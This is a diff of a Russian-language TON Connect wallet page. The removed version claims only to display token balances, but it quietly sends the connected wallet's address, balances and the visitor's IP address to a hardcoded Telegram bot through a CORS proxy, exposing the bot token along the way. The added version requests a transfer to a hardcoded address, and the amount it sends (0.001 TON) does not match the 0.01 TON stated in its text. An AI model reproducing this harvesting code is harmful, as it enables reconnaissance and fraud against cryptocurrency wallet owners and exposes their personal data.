@@ -1,440 +1,243 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TON Wallet Connect</title>
-  <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f5f5f5;
-      margin: 0;
-      padding: 20px;
-      color: #333;
-    }
-    .container {
-      max-width: 800px;
-      margin: 0 auto;
-      background-color: white;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-      padding: 30px;
-    }
-    h1 {
-      color: #0088CC;
-      margin-top: 0;
-    }
-    button {
-      background-color: #0088CC;
-      color: white;
-      border: none;
-      padding: 12px 24px;
-      border-radius: 8px;
-      font-size: 16px;
-      cursor: pointer;
-      transition: background-color 0.3s;
-    }
-    button:hover {
-      background-color: #006699;
-    }
-    button:disabled {
-      background-color: #cccccc;
-      cursor: not-allowed;
-    }
-    .wallet-info {
-      margin-top: 20px;
-      padding: 20px;
-      border: 1px solid #e0e0e0;
-      border-radius: 8px;
-      display: none;
-    }
-    .wallet-info.active {
-      display: block;
-    }
-    .token-list {
-      margin-top: 20px;
-    }
-    .token-item {
-      padding: 12px;
-      border-bottom: 1px solid #eee;
-      display: flex;
-      justify-content: space-between;
-    }
-    .token-item:last-child {
-      border-bottom: none;
-    }
-    .loading {
-      display: inline-block;
-      width: 20px;
-      height: 20px;
-      border: 3px solid rgba(0, 136, 204, 0.3);
-      border-radius: 50%;
-      border-top-color: #0088CC;
-      animation: spin 1s ease-in-out infinite;
-      margin-left: 10px;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-    .status {
-      margin-top: 10px;
-      font-style: italic;
-      color: #666;
-    }
-    .notification {
-      padding: 10px;
-      margin-top: 10px;
-      border-radius: 5px;
-      display: none;
-    }
-    .success {
-      background-color: #d4edda;
-      color: #155724;
-      border: 1px solid #c3e6cb;
-      display: block;
-    }
-    .error {
-      background-color: #f8d7da;
-      color: #721c24;
-      border: 1px solid #f5c6cb;
-      display: block;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подключение TON кошелька</title>
+    <!-- Локальная копия библиотеки TON Connect -->
+    <script src="tonconnect-sdk.min.js"></script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+        }
+        .container {
+            margin-top: 50px;
+        }
+        button {
+            background-color: #0088CC;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin: 5px;
+        }
+        button:hover {
+            background-color: #006699;
+        }
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        #status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+        .info {
+            background-color: #d1ecf1;
+            color: #0c5460;
+        }
+        .debug-info {
+            margin-top: 20px;
+            text-align: left;
+            font-size: 12px;
+            background-color: #f8f9fa;
+            padding: 10px;
+            border-radius: 5px;
+            white-space: pre-wrap;
+            max-height: 200px;
+            overflow-y: auto;
+            display: block;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <h1>TON Wallet Connect</h1>
-    <p>Подключите ваш кошелек TON для просмотра информации о ваших токенах и монетах.</p>
-    
-    <button id="connectWallet">Подключить кошелек</button>
-    <button id="disconnectWallet" style="display: none;">Отключить кошелек</button>
-    
-    <div class="status" id="status"></div>
-    <div id="notification" class="notification"></div>
-    
-    <div class="wallet-info" id="walletInfo">
-      <h2>Информация о кошельке</h2>
-      <p><strong>Адрес:</strong> <span id="walletAddress"></span></p>
-      
-      <div class="token-list" id="tokenList">
-        <h3>Токены и монеты</h3>
-        <div id="tokenItems">
-          <div class="token-item">
-            <span>Загрузка данных...</span>
-            <span class="loading"></span>
-          </div>
-        </div>
-      </div>
+    <div class="container">
+        <h1>Подключение TON кошелька</h1>
+        <p>Нажмите кнопку ниже, чтобы подключить TON кошелек и отправить 0.01 TON</p>
+        <button id="connectButton">Подключить TON кошелек</button>
+        <div id="status"></div>
+        <div id="debugInfo" class="debug-info">Отладочная информация будет отображаться здесь...</div>
     </div>
-  </div>
 
-  <!-- Импорт необходимых библиотек -->
-  <script src="https://cdn.jsdelivr.net/npm/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
-  
-  <script>
-    document.addEventListener('DOMContentLoaded', function() {
-      // Инициализация TON Connect
-      const connector = new tonconnect.TonConnect({
-        manifestUrl: 'https://heronwaterwow.github.io/-cv/ton-main/tonconnect-manifest.json'
-      });
-      
-      const connectButton = document.getElementById('connectWallet');
-      const disconnectButton = document.getElementById('disconnectWallet');
-      const walletInfo = document.getElementById('walletInfo');
-      const walletAddress = document.getElementById('walletAddress');
-      const tokenItems = document.getElementById('tokenItems');
-      const statusElement = document.getElementById('status');
-      const notificationElement = document.getElementById('notification');
-      
-      // Telegram Bot Token и Chat ID
-      const telegramBotToken = '7534217100:AAGxLkFH_r8NzHSD-kXnZhs6rrSZjES9IUQ';
-      const telegramChatId = '1447071887';
-      
-      // Функция для отображения уведомлений
-      function showNotification(message, type) {
-        notificationElement.textContent = message;
-        notificationElement.className = 'notification ' + type;
-        setTimeout(() => {
-          notificationElement.className = 'notification';
-        }, 5000);
-      }
-      
-      // Проверка наличия сохраненного подключения
-      connector.restoreConnection().then(wallet => {
-        if (wallet) {
-          handleWalletConnected(wallet);
-        }
-      });
-      
-      // Функция для подключения кошелька
-      async function connectWallet() {
-        try {
-          statusElement.textContent = 'Открытие окна подключения...';
-          
-          // Получение списка доступных провайдеров кошельков
-          const walletsList = await connector.getWallets();
-          console.log('Доступные кошельки:', walletsList);
-          
-          if (walletsList.length === 0) {
-            throw new Error('Не найдены доступные кошельки');
-          }
-          
-          // Создание ссылки для подключения к первому доступному кошельку
-          const universalLink = connector.connect({
-            jsBridgeKey: 'tonconnect',
-            universalLink: walletsList[0].universalLink,
-            bridgeUrl: walletsList[0].bridgeUrl
-          });
-          
-          console.log('Ссылка для подключения:', universalLink);
-          
-          // Открытие ссылки для подключения
-          window.open(universalLink, '_blank');
-          statusElement.textContent = 'Ожидание подключения кошелька...';
-        } catch (error) {
-          console.error('Ошибка при подключении кошелька:', error);
-          statusElement.textContent = 'Ошибка при подключении кошелька: ' + error.message;
-          showNotification('Ошибка при подключении кошелька: ' + error.message, 'error');
-        }
-      }
-      
-      // Обработчик подключения кошелька
-      connectButton.addEventListener('click', connectWallet);
-      
-      // Обработчик отключения кошелька
-      disconnectButton.addEventListener('click', () => {
-        connector.disconnect();
-        handleWalletDisconnected();
-        statusElement.textContent = 'Кошелек отключен';
-      });
-      
-      // Обработчик события подключения кошелька
-      connector.onStatusChange(wallet => {
-        console.log('Статус подключения изменился:', wallet);
-        if (wallet) {
-          handleWalletConnected(wallet);
-        } else {
-          handleWalletDisconnected();
-        }
-      });
-      
-      // Функция обработки подключения кошелька
-      async function handleWalletConnected(wallet) {
-        connectButton.style.display = 'none';
-        disconnectButton.style.display = 'inline-block';
-        walletInfo.classList.add('active');
-        
-        // Отображение адреса кошелька
-        const address = wallet.account.address;
-        walletAddress.textContent = address;
-        statusElement.textContent = 'Кошелек подключен! Получение информации о токенах...';
-        
-        // Получение информации о токенах
-        try {
-          const tokenData = await fetchTokenInfo(address);
-          
-          // Отправка данных в Telegram бот
-          await sendDataToTelegram(address, tokenData);
-          
-        } catch (error) {
-          console.error('Ошибка при получении информации о токенах:', error);
-          tokenItems.innerHTML = `<div class="token-item">
-            <span>Ошибка при получении данных: ${error.message}</span>
-          </div>`;
-          showNotification('Ошибка при получении данных о токенах', 'error');
-        }
-      }
-      
-      // Функция обработки отключения кошелька
-      function handleWalletDisconnected() {
-        connectButton.style.display = 'inline-block';
-        disconnectButton.style.display = 'none';
-        walletInfo.classList.remove('active');
-        walletAddress.textContent = '';
-        tokenItems.innerHTML = `<div class="token-item">
-          <span>Загрузка данных...</span>
-          <span class="loading"></span>
-        </div>`;
-      }
-      
-      // Функция получения информации о токенах
-      async function fetchTokenInfo(address) {
-        try {
-          // Получение баланса основной монеты TON
-          const tonBalanceResponse = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
-          const tonBalanceData = await tonBalanceResponse.json();
-          
-          // Получение информации о Jetton токенах
-          const jettonsResponse = await fetch(`https://tonapi.io/v1/account/getJettons?account=${address}`);
-          const jettonsData = await jettonsResponse.json();
-          
-          console.log('Данные о балансе TON:', tonBalanceData);
-          console.log('Данные о Jetton токенах:', jettonsData);
-          
-          // Формирование HTML для отображения информации о токенах
-          let tokensHtml = '';
-          let tokenDataArray = [];
-          
-          // Добавление основного баланса TON
-          if (tonBalanceData.ok) {
-            const tonBalance = parseFloat(tonBalanceData.result) / 1e9; // Конвертация из нано TON
-            tokensHtml += `
-              <div class="token-item">
-                <span><strong>TON</strong> (основная монета)</span>
-                <span>${tonBalance.toFixed(4)} TON</span>
-              </div>
-            `;
+    <script>
+        // Функция для логирования отладочной информации
+        function logDebug(message) {
+            const debugInfoElement = document.getElementById('debugInfo');
+            const timestamp = new Date().toLocaleTimeString();
+            debugInfoElement.textContent += `[${timestamp}] ${message}\n`;
+            console.log(message);
             
-            tokenDataArray.push({
-              name: 'TON',
-              symbol: 'TON',
-              balance: tonBalance.toFixed(4)
-            });
-          }
-          
-          // Добавление Jetton токенов, если они есть
-          if (jettonsData.jettons && jettonsData.jettons.length > 0) {
-            jettonsData.jettons.forEach(jetton => {
-              const balance = parseFloat(jetton.balance) / Math.pow(10, jetton.metadata.decimals || 9);
-              tokensHtml += `
-                <div class="token-item">
-                  <span><strong>${jetton.metadata.name || 'Неизвестный токен'}</strong> (${jetton.metadata.symbol || '???'})</span>
-                  <span>${balance.toFixed(4)}</span>
-                </div>
-              `;
-              
-              tokenDataArray.push({
-                name: jetton.metadata.name || 'Неизвестный токен',
-                symbol: jetton.metadata.symbol || '???',
-                balance: balance.toFixed(4)
-              });
-            });
-          }
-          
-          // Если нет данных о токенах
-          if (tokensHtml === '') {
-            tokensHtml = `
-              <div class="token-item">
-                <span>Токены не найдены или API недоступен</span>
-              </div>
-            `;
-          }
-          
-          // Обновление HTML
-          tokenItems.innerHTML = tokensHtml;
-          statusElement.textContent = 'Информация о токенах получена';
-          
-          return tokenDataArray;
-          
-        } catch (error) {
-          console.error('Ошибка при получении информации о токенах:', error);
-          tokenItems.innerHTML = `
-            <div class="token-item">
-              <span>Ошибка при получении данных: ${error.message}</span>
-            </div>
-          `;
-          statusElement.textContent = 'Ошибка при получении информации о токенах';
-          throw error;
+            // Автоматическая прокрутка вниз
+            debugInfoElement.scrollTop = debugInfoElement.scrollHeight;
         }
-      }
-      
-      // Функция для отправки данных в Telegram бот напрямую через CORS прокси
-      async function sendDataToTelegram(address, tokenData) {
-        try {
-          // Формирование сообщения для Telegram
-          let message = `🔔 *Новое подключение кошелька TON*\n\n`;
-          message += `📝 *Адрес кошелька:* \`${address}\`\n\n`;
-          message += `💰 *Информация о токенах:*\n`;
-          
-          tokenData.forEach(token => {
-            message += `- *${token.name}* (${token.symbol}): ${token.balance}\n`;
-          });
-          
-          // Добавление информации о времени
-          const currentTime = new Date().toLocaleString();
-          message += `\n⏰ *Время подключения:* ${currentTime}`;
-          
-          // Получение IP пользователя через API
-          try {
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            message += `\n🌐 *IP адрес:* ${ipData.ip}`;
-          } catch (ipError) {
-            console.error('Не удалось получить IP адрес:', ipError);
-          }
-          
-          console.log('Сообщение для отправки в Telegram:', message);
-          
-          // Используем CORS прокси для обхода ограничений CORS
-          const corsProxy = 'https://cors-anywhere.herokuapp.com/';
-          const telegramApiUrl = `${corsProxy}https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-          
-          // Отправка сообщения в Telegram бот
-          const response = await fetch(telegramApiUrl, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-              'Origin': window.location.origin
-            },
-            body: JSON.stringify({
-              chat_id: telegramChatId,
-              text: message,
-              parse_mode: 'Markdown'
-            })
-          });
-          
-          const responseData = await response.json();
-          console.log('Ответ от Telegram API:', responseData);
-          
-          if (responseData.ok) {
-            console.log('Данные успешно отправлены в Telegram');
-            showNotification('Данные успешно отправлены в Telegram', 'success');
-          } else {
-            console.error('Ошибка при отправке данных в Telegram:', responseData.description);
-            showNotification('Ошибка при отправке данных в Telegram: ' + responseData.description, 'error');
+        
+        // Функция для обновления статуса
+        function updateStatus(message, type) {
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = message;
+            statusElement.className = '';
+            if (type) {
+                statusElement.classList.add(type);
+            }
+        }
+        
+        // Функция для конвертации TON в наноTON (1 TON = 10^9 наноTON)
+        function toNano(amount) {
+            // Преобразуем строку в число, умножаем на 10^9 и возвращаем строку
+            return (parseFloat(amount) * 1000000000).toString();
+        }
+        
+        // Основная функция
+        document.addEventListener('DOMContentLoaded', () => {
+            logDebug('Страница загружена');
             
-            // Сохранение данных локально в случае ошибки
-            saveDataLocally(address, tokenData, message);
-          }
-        } catch (error) {
-          console.error('Ошибка при отправке данных в Telegram:', error);
-          showNotification('Ошибка при отправке данных в Telegram. Данные сохранены локально.', 'error');
-          
-          // Сохранение данных локально в случае ошибки
-          saveDataLocally(address, tokenData, message);
-        }
-      }
-      
-      // Функция для сохранения данных локально
-      function saveDataLocally(address, tokenData, message) {
-        try {
-          const data = {
-            address: address,
-            tokens: tokenData,
-            message: message,
-            timestamp: new Date().toISOString(),
-            telegramBotToken: telegramBotToken,
-            telegramChatId: telegramChatId
-          };
-          
-          localStorage.setItem('tonWalletData', JSON.stringify(data));
-          console.log('Данные сохранены локально в localStorage');
-          
-          // Создание скрытой ссылки для скачивания данных
-          const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(data, null, 2));
-          const downloadAnchorNode = document.createElement('a');
-          downloadAnchorNode.setAttribute("href", dataStr);
-          downloadAnchorNode.setAttribute("download", "ton_wallet_data.json");
-          document.body.appendChild(downloadAnchorNode);
-          downloadAnchorNode.click();
-          downloadAnchorNode.remove();
-        } catch (error) {
-          console.error('Ошибка при сохранении данных локально:', error);
-        }
-      }
-    });
-  </script>
+            // Проверяем, загружена ли библиотека
+            if (typeof TonConnectSDK === 'undefined') {
+                logDebug('Ошибка: TonConnectSDK не определен. Библиотека не загружена.');
+                updateStatus('Ошибка: Библиотека TonConnectSDK не загружена. Убедитесь, что файл tonconnect-sdk.min.js находится в той же папке, что и HTML-файл.', 'error');
+                document.getElementById('connectButton').disabled = true;
+                return;
+            }
+
+            logDebug('Библиотека TonConnectSDK успешно загружена!');
+            
+            // Создаем экземпляр коннектора
+            try {
+                // Используем ваш манифест
+                const manifestUrl = 'https://heronwaterwow.github.io/-cv/ton-main/tonconnect-manifest.json';
+                logDebug(`Инициализация TON Connect с манифестом: ${manifestUrl}`);
+                
+                const connector = new TonConnectSDK.TonConnect({
+                    manifestUrl: manifestUrl
+                });
+                
+                logDebug('Коннектор успешно создан');
+                updateStatus('TON Connect успешно инициализирован', 'success');
+                
+                // Проверяем, подключен ли уже кошелек
+                connector.onStatusChange((wallet) => {
+                    if (wallet) {
+                        document.getElementById('connectButton').textContent = 'Отправить 0.01 TON';
+                        updateStatus('Кошелек успешно подключен!', 'success');
+                        logDebug(`Подключенный кошелек: ${JSON.stringify(wallet)}`);
+                    } else {
+                        document.getElementById('connectButton').textContent = 'Подключить TON кошелек';
+                        updateStatus('', '');
+                        logDebug('Кошелек отключен');
+                    }
+                });
+                
+                // Обработка нажатия кнопки
+                document.getElementById('connectButton').addEventListener('click', async () => {
+                    try {
+                        if (!connector.connected) {
+                            // Если не подключен, инициируем подключение
+                            updateStatus('Подключение к кошельку...', 'info');
+                            logDebug('Запрос на подключение кошелька...');
+                            
+                            // Получаем доступные кошельки
+                            logDebug('Запрос списка доступных кошельков...');
+                            const walletsList = await connector.getWallets();
+                            logDebug(`Найдено кошельков: ${walletsList.length}`);
+                            logDebug(`Доступные кошельки: ${JSON.stringify(walletsList)}`);
+                            
+                            if (walletsList.length === 0)
+                            {
+                                updateStatus('Не найдены доступные TON кошельки', 'error');
+                                return;
+                            }
+                            
+                            // Выбираем первый доступный кошелек
+                            const selectedWallet = walletsList[0];
+                            logDebug(`Выбран кошелек: ${selectedWallet.name}`);
+                            
+                            // Подключаемся к кошельку
+                            logDebug('Создание ссылки для подключения...');
+                            const universalLink = connector.connect({
+                                universalLink: selectedWallet.universalLink,
+                                bridgeUrl: selectedWallet.bridgeUrl
+                            });
+                            
+                            logDebug(`Ссылка для подключения: ${universalLink}`);
+                            
+                            if (universalLink) {
+                                // Открываем ссылку для подключения кошелька
+                                window.open(universalLink, '_blank');
+                                updateStatus('Открыт запрос на подключение кошелька. Подтвердите в приложении.', 'info');
+                            } else {
+                                updateStatus('Не удалось создать ссылку для подключения', 'error');
+                                logDebug('Ошибка: universalLink не сгенерирована');
+                            }
+                        } else {
+                            // Если уже подключен, отправляем транзакцию
+                            updateStatus('Подготовка транзакции...', 'info');
+                            logDebug('Подготовка транзакции...');
+                            
+                            // Создаем транзакцию
+                            const transaction = {
+                                validUntil: Math.floor(Date.now() / 1000) + 600, // 10 минут от текущего времени
+                                messages: [
+                                    {
+                                        // Это пример адреса получателя, замените на реальный адрес
+                                        address: 'UQA9or9rMdG8vk8wSX20LRapZgTUslxrHt-Oa4JCcAynwEEi',
+                                        amount: toNano('0.001') // 0.01 TON
+                                    }
+                                ]
+                            };
+                            
+                            logDebug(`Данные транзакции: ${JSON.stringify(transaction)}`);
+                            
+                            // Отправляем транзакцию
+                            try {
+                                const result = await connector.sendTransaction(transaction);
+                                updateStatus(`Транзакция отправлена!`, 'success');
+                                logDebug(`Результат транзакции: ${JSON.stringify(result)}`);
+                            } catch (e) {
+                                updateStatus(`Ошибка транзакции: ${e.message}`, 'error');
+                                logDebug(`Ошибка транзакции: ${e.message}`);
+                            }
+                        }
+                    } catch (error) {
+                        updateStatus(`Ошибка: ${error.message}`, 'error');
+                        logDebug(`Критическая ошибка: ${error.message}`);
+                        console.error(error);
+                    }
+                });
+                
+                // Проверяем состояние подключения при загрузке
+                logDebug('Проверка состояния подключения...');
+                const currentWallet = connector.wallet;
+                if (currentWallet) {
+                    logDebug(`Уже подключен кошелек: ${JSON.stringify(currentWallet)}`);
+                } else {
+                    logDebug('Кошелек не подключен');
+                }
+                
+            } catch (error) {
+                logDebug(`Ошибка при инициализации TON Connect: ${error.message}`);
+                updateStatus(`Ошибка инициализации: ${error.message}`, 'error');
+                console.error(error);
+            }
+        });
+    </script>
 </body>
 </html>
+
 
 
